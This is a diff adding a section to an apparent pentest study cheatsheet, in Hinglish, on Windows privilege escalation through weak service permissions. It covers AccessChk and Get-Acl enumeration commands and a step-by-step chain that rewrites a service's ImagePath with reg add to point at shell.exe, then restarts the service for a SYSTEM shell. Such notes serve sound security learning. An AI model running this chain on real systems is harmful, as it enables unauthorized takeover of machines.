@@ -222,7 +222,196 @@ Most beginners:
 * Manually verify registry paths
 * Chain:
 
-  ```
-  Writable registry → modify service → restart → SYSTEM shell
-  ```
+
+---
+
+# 🧠 16. 🔐 Permission Enumeration (CRITICAL)
+
+*(Ye hi decide karta hai ki PrivEsc possible hai ya nahi)*
+
+---
+
+# 🛠️ AccessChk – Most Important Tool
+
+### 🔹 Registry Key Permissions
+
+```bash
+accesschk.exe /accepteula -uvwqk hklm\system\currentcontrolset\services\regsvc
+```
+
+👉 Breakdown:
+
+* `-u` → suppress errors
+* `-v` → verbose
+* `-w` → show **write access only** 🔥
+* `-q` → quiet banner
+* `-k` → registry key
+
+👉 Goal:
+
+✔ Check if **low-priv user can modify service registry key**
+
+---
+
+## 🔥 What to Look For
+
+If you see:
+
+```
+RW BUILTIN\Users
+```
+
+👉 💥 GAME OVER:
+
+You can:
+
+* Modify service config
+* Change `ImagePath`
+* Point to malicious binary
+
+---
+
+# ⚙️ Service Permission Check
+
+```bash
+accesschk.exe /accepteula -ucqv regsvc
+```
+
+👉 Flags:
+
+* `-u` → suppress errors
+* `-c` → service
+* `-q` → quiet
+* `-v` → verbose
+
+👉 Goal:
+
+✔ Can you:
+
+* Start/stop service
+* Change config 🔥
+
+---
+
+# 📁 File / Directory Permissions
+
+```bash
+accesschk.exe /accepteula -uws "Users" C:\Program Files
+```
+
+👉 Flags:
+
+* `-w` → writable
+* `-s` → recursive
+
+👉 Look for:
+
+✔ Writable folders inside Program Files
+✔ Replace binary → restart service → SYSTEM
+
+---
+
+# 👤 Check Specific User Permissions
+
+```bash
+accesschk.exe -uwcqv <username> *
+```
+
+👉 Shows:
+
+* Where that user has write/control
+
+---
+
+# 🧬 Registry Wide Scan (Advanced)
+
+```bash
+accesschk.exe -kvuqsw hklm\Software
+```
+
+👉 🔥 Finds:
+
+* Writable registry keys across system
+
+---
+
+# ⚡ PowerShell Alternative (No AccessChk)
+
+## Check file permissions
+
+```powershell
+Get-Acl "C:\Path\file.exe"
+```
+
+---
+
+## Check registry permissions
+
+```powershell
+Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\regsvc"
+```
+
+---
+
+# 🔥 Real Attack Flow (Important)
+
+### Step 1: Find writable service key
+
+```
+accesschk → writable HKLM\Services
+```
+
+### Step 2: Modify registry
+
+```bash
+reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
+```
+
+### Step 3: Restart service
+
+```bash
+net stop regsvc
+net start regsvc
+```
+
+👉 💥 SYSTEM shell
+
+---
+
+# 🧠 Senior Operator Mindset
+
+Har jagah ye socho:
+
+* ❓ Kya mujhe **WRITE permission** hai?
+* ❓ Kya ye **execution ko control karta hai?**
+* ❓ Kya main ise **trigger kar sakta hu?**
+
+---
+
+# 🚨 Common Mistake (Important)
+
+❌ Sirf ye dekhna:
+
+```
+sc qc service
+```
+
+✔ Ye bhi check karo:
+
+```
+accesschk → permissions
+```
+
+👉 Kyunki:
+
+> Config visible ≠ Config modifiable
+
+---
+
+# 🔥 Golden Rule
+
+> **"If you can WRITE → you can OWN the system."**
+
+---
+
 
